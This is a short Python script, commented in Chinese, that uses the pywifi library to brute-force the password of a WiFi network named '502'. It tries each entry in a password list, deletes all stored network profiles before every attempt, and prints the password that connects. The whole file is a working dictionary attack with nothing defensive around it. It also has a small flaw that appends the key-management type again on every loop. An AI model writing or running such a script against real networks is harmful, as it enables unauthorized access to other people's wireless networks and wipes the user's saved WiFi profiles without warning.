import time
import comtypes
import pywifi
from pywifi import const

# 定义WiFi配置对象
wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]  # 选择第一个WiFi接口

# 定义WiFi配置对象
profile = pywifi.Profile()
profile.ssid = "502"  # 替换为你的WiFi名称

# 假设你有一个密码列表
passwords = ["password1", "password2", "password3"]

# 遍历密码列表，尝试连接
for password in passwords:
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    # 删除所有网络配置
    iface.remove_all_network_profiles()

    # 加载新的配置
    tmp_profile = iface.add_network_profile(profile)

    # 尝试连接
    iface.connect(tmp_profile)
    time.sleep(5)  # 等待5秒，让连接尝试完成

    # 检查连接状态
    # bug修复: 将检查连接状态的代码移到sleep之后
    if iface.status() == const.IFACE_CONNECTED:
        print(f"Connected to {profile.ssid} with password {password}")
        break  # 连接成功，退出循环
    else:
        print(f"Failed to connect to {profile.ssid} with password {password}")

# 如果没有找到正确的密码
if iface.status()!= const.IFACE_CONNECTED:
    print("No correct password found in the list.")
